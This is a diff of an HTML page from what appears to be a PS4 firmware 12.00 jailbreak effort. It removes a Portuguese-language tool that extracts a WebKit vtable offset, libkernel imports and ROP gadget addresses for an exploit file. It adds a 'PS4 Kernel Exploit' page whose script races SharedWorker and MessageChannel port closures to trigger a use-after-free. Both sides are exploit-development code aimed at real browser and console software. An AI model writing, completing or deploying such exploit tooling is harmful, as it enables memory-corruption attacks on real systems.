@@ -1,275 +1,61 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 FW 12.00 Forensic Extractor</title>
-    <style>
-        body { background-color: #1a1a1a; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; }
-        
-        #drop-zone {
-            border: 2px dashed #444; padding: 40px; text-align: center; margin-bottom: 20px; 
-            cursor: pointer; background: #252526; transition: 0.2s;
-        }
-        #drop-zone:hover { border-color: #0f0; background: #2d2d30; }
-        
-        #log {
-            width: 100%; height: 400px; background-color: #000; color: #ffff00; 
-            border: 1px solid #333; padding: 10px; font-family: monospace; font-size: 13px; resize: vertical;
-        }
-        
-        .progress-bar { width: 100%; background: #333; height: 10px; margin-top: 5px; }
-        .progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.1s; }
-        
-        h2 { border-bottom: 1px solid #444; padding-bottom: 10px; }
-        .btn { background: #0f0; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
-        .status { color: #aaa; margin-bottom: 10px; font-style: italic; }
-    </style>
+    <title>PS4 Kernel Exploit</title>      
 </head>
 <body>
 
-<div class="container">
-    <h2>PS4 FW 12.00 Forensic Extractor</h2>
-    <p>Arraste os arquivos JSON/TXT (Simbolos.txt, IMPORTS.json, DUMP.json) para extrair os offsets.</p>
-    
-    <div id="drop-zone">
-        CLIQUE OU ARRASTE OS ARQUIVOS AQUI
-        <input type="file" id="fileInput" multiple style="display:none">
+    <div class="section">
+        <h2>SharedWorkerProxy Use-After-Free</h2>       
+
+        <button onclick="runSharedProxy()">SharedWorkerProxy</button>      
+        
     </div>
 
-    <div id="status-area"></div>
-    
-    <textarea id="log" readonly placeholder="Os offsets extraídos aparecerão aqui..."></textarea>
-    <button class="btn" onclick="copyResult()">Copiar Resultado</button>
-</div>
+    <div id="log"></div>
+    <div id="dummy"></div>
+    <div id="sandbox"></div>
 
-<script>
-    // --- MAPA DE BUSCA ---
-    // O que estamos procurando em cada tipo de arquivo
-    const TARGETS = {
-        vtable: { 
-            found: false, 
-            val: "0xDEADBEEF", 
-            keys: ["HTMLTextAreaElement", "_ZTVN7WebCore19HTMLTextAreaElementE"] 
-        },
-        imports: {
-            "__stack_chk_fail": null,
-            "memset": null,
-            "setjmp": null,
-            "longjmp": null,
-            "getcontext": null
-        },
-        gadgets: {
-            "pop rdi": null,
-            "pop rsi": null,
-            "pop rdx": null,
-            "pop rcx": null,
-            "pop rax": null,
-            "pop rsp": null,
-            "mov [rdi], rax": null,
-            "mov rax, [rdi]": null,
-            "syscall": null
-        }
-    };
+    <script>
+        function log(msg) { 
+            const el = document.getElementById('log');
+            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
+        }      
 
-    const CHUNK_SIZE = 5 * 1024 * 1024; // 5MB por bloco
-
-    document.getElementById('drop-zone').addEventListener('click', () => document.getElementById('fileInput').click());
-    document.getElementById('fileInput').addEventListener('change', handleFiles);
-    document.getElementById('drop-zone').addEventListener('dragover', (e) => { e.preventDefault(); e.dataTransfer.dropEffect = 'copy'; });
-    document.getElementById('drop-zone').addEventListener('drop', (e) => { e.preventDefault(); handleFiles({ target: { files: e.dataTransfer.files } }); });
-
-    async function handleFiles(e) {
-        const files = Array.from(e.target.files);
-        if (files.length === 0) return;
-
-        log("--- INICIANDO ANÁLISE EM BLOCOS ---");
-
-        for (const file of files) {
-            await processFile(file);
-        }
-        
-        generateReport();
-    }
-
-    async function processFile(file) {
-        addStatus(file.name, 0);
-        const size = file.size;
-        let offset = 0;
-        let leftover = ""; // Resto de texto cortado entre blocos
-
-        // Detecta o tipo de arquivo pelo nome
-        let type = "unknown";
-        if (file.name.includes("Simbolos") || file.name.includes("RELOCS")) type = "symbols";
-        else if (file.name.includes("IMPORTS")) type = "imports";
-        else if (file.name.includes("DUMP") || file.name.includes("gadget")) type = "gadgets";
-        
-        log(`\n[+] Analisando: ${file.name} (Modo: ${type.toUpperCase()})`);
-
-        while (offset < size) {
-            // Lê um bloco
-            const chunk = await readChunk(file, offset, offset + CHUNK_SIZE);
-            const text = leftover + chunk; // Junta com o resto do anterior
+       
+        function runSharedProxy() {
+            log("Iniciando Proxy Race...");
             
-            // Processa linhas completas
-            const lastNewline = text.lastIndexOf('\n');
-            let linesBlock = "";
+            const workerCode = `
+                onmessage = (e) => {
+                    const port = e.ports[0];
+                    // Bombardeia a porta de volta
+                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
             
-            if (lastNewline !== -1) {
-                linesBlock = text.substring(0, lastNewline);
-                leftover = text.substring(lastNewline + 1); // Guarda o pedaço final para o próximo
-            } else {
-                // Se não tiver newline, guarda tudo (arquivo pequeno ou linha gigante)
-                if (offset + CHUNK_SIZE >= size) linesBlock = text; // Fim do arquivo
-                else { leftover = text; linesBlock = ""; }
-            }
-
-            // --- LÓGICA DE PARSER (Linha a Linha para não estourar RAM) ---
-            if (linesBlock.length > 0) {
-                parseBlock(linesBlock, type);
-            }
-
-            offset += CHUNK_SIZE;
-            updateStatus(file.name, Math.min(100, (offset / size) * 100));
-            
-            // Pequena pausa para a UI respirar (Anti-Freeze)
-            await new Promise(r => setTimeout(r, 10)); 
-        }
-        
-        // Processa o resto final
-        if (leftover.length > 0) parseBlock(leftover, type);
-        updateStatus(file.name, 100);
-    }
-
-    function readChunk(file, start, end) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            const slice = file.slice(start, end);
-            reader.onload = e => resolve(e.target.result);
-            reader.onerror = reject;
-            reader.readAsText(slice);
-        });
-    }
-
-    function parseBlock(text, type) {
-        // Regex simplificada para achar JSON key/value ou linhas de texto
-        // Formato esperado: "name": "...", "offset": 12345
-        // Ou texto: 0x004500 symbol_name
-
-        if (type === "symbols") {
-            // Procura VTable
-            if (!TARGETS.vtable.found) {
-                for (let key of TARGETS.vtable.keys) {
-                    // Procura o nome e um padrão hexadecimal próximo
-                    const regex = new RegExp(`(${key}).*?(0x[0-9a-fA-F]+|[0-9]{5,})`, "i");
-                    const match = text.match(regex);
-                    if (match) {
-                        // Tenta achar qual parte é o hex
-                        const parts = match[0].match(/0x[0-9a-fA-F]+/);
-                        if (parts) {
-                            TARGETS.vtable.val = parts[0];
-                            TARGETS.vtable.found = true;
-                            log(`   [ACHADO] VTable: ${parts[0]}`);
-                        }
-                    }
-                }
-            }
+            let i = 0;
+            const interval = setInterval(() => {
+                const mc = new MessageChannel();
+                const sw = new SharedWorker(url, "race_" + i);
+                sw.port.postMessage("init", [mc.port2]);
+                
+                // Fecha a porta local imediatamente (lado do proxy)
+                // enquanto o worker bombardeia o outro lado
+                setTimeout(() => {
+                    sw.port.close(); // Tenta invalidar o proxy
+                    mc.port1.close();
+                }, Math.random() * 10);
+                
+                i++;
+                if (i % 50 === 0) log(`Proxies destruidos: ${i}`);
+                if (i > 500) clearInterval(interval);
+            }, 20);
         }
 
-        if (type === "imports") {
-            for (let imp in TARGETS.imports) {
-                if (TARGETS.imports[imp] === null) {
-                    // Procura "name": "memset" ... "offset": 12345
-                    // Como estamos em blocos, o regex pode falhar se quebrar a linha,
-                    // mas a estatística ajuda em arquivos grandes.
-                    // Busca simples por string primeiro para performance
-                    const idx = text.indexOf(imp);
-                    if (idx !== -1) {
-                        // Se achou o nome, olha em volta (contexto de 100 chars)
-                        const context = text.substring(Math.max(0, idx - 50), Math.min(text.length, idx + 100));
-                        const hexMatch = context.match(/0x[0-9a-fA-F]+/);
-                        const decMatch = context.match(/"offset"\s*:\s*(\d+)/);
-                        
-                        if (hexMatch) TARGETS.imports[imp] = hexMatch[0];
-                        else if (decMatch) TARGETS.imports[imp] = "0x" + parseInt(decMatch[1]).toString(16);
-                        
-                        if (TARGETS.imports[imp]) log(`   [ACHADO] Import ${imp}: ${TARGETS.imports[imp]}`);
-                    }
-                }
-            }
-        }
-
-        if (type === "gadgets") {
-            for (let gad in TARGETS.gadgets) {
-                if (TARGETS.gadgets[gad] === null) {
-                    // Regex para "0x...... : pop rdi ; ret"
-                    // Normaliza espaços
-                    const normGad = gad.replace(" ", "\\s+").replace("[", "\\[").replace("]", "\\]");
-                    const regex = new RegExp(`(0x[0-9a-fA-F]+).*?${normGad}.*?ret`, "i");
-                    const match = text.match(regex);
-                    
-                    if (match) {
-                        TARGETS.gadgets[gad] = match[1];
-                        log(`   [ACHADO] Gadget ${gad}: ${match[1]}`);
-                    }
-                }
-            }
-        }
-    }
-
-    function generateReport() {
-        const out = document.getElementById('log');
-        let js = "\n\n/* --- OFFSETS EXTRAÍDOS (COPIE PARA 1200.mjs) --- */\n\n";
-        
-        js += `// VTable Offset (CRÍTICO)\n`;
-        js += `const off_ta_vt = ${TARGETS.vtable.val};\n\n`;
-        
-        js += `// Imports (LibKernel Bridges)\n`;
-        for (let imp in TARGETS.imports) {
-            if (TARGETS.imports[imp]) js += `const off_${imp} = ${TARGETS.imports[imp]};\n`;
-            else js += `// const off_${imp} = ???; (Não encontrado)\n`;
-        }
-
-        js += `\n// Gadget Map\nconst gadget_map = {\n`;
-        for (let gad in TARGETS.gadgets) {
-            if (TARGETS.gadgets[gad]) js += `    "${gad}; ret": ${TARGETS.gadgets[gad]},\n`;
-            else js += `    // "${gad}; ret": null,\n`;
-        }
-        js += `};\n`;
-
-        out.value += js;
-        out.scrollTop = out.scrollHeight;
-    }
-
-    // UI Helpers
-    function log(msg) {
-        const out = document.getElementById('log');
-        out.value += msg + "\n";
-        out.scrollTop = out.scrollHeight;
-    }
-    
-    function addStatus(name, pct) {
-        const div = document.createElement('div');
-        div.id = "status-" + name.replace(/[^a-z0-9]/gi, '');
-        div.innerHTML = `<div style="display:flex; justify-content:space-between;"><span>${name}</span><span class="pct">0%</span></div><div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div>`;
-        document.getElementById('status-area').appendChild(div);
-    }
-    
-    function updateStatus(name, pct) {
-        const id = "status-" + name.replace(/[^a-z0-9]/gi, '');
-        const el = document.getElementById(id);
-        if (el) {
-            el.querySelector('.progress-fill').style.width = pct + "%";
-            el.querySelector('.pct').innerText = Math.floor(pct) + "%";
-        }
-    }
-
-    function copyResult() {
-        document.getElementById('log').select();
-        document.execCommand('copy');
-        alert("Código copiado!");
-    }
-</script>
-
+    </script>
 </body>
 </html>
